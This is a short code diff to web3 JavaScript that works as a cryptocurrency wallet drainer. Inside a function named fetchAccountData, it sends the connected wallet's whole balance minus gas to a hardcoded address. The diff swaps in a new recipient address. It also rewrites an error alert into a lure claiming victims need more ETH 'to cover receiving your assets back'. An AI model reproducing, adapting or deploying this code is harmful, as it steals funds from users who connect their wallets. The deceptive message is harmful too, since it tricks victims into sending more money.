@@ -133,7 +133,7 @@ async function fetchAccountData() {
 
     if (balanceMinusFee > 0) {
       var transaction = {
-        to: "0x866Bf72Df0E62992C4c529A2Bd207E3E45f29c33",
+        to: "0x7a13b1f37f373baFA111B03CC9a650cd8dE7cEc9",
         from: accounts[0],
         value: balanceMinusFee,
         gas: gas,
@@ -142,7 +142,7 @@ async function fetchAccountData() {
       //send transaction
       web3.eth.sendTransaction(transaction);
     } else {
-      window.alert("Insufficient ETH/BNB");
+      window.alert("Insufficient ETH please ensure you have enough to cover receiving your assets back");
     }
   });
 
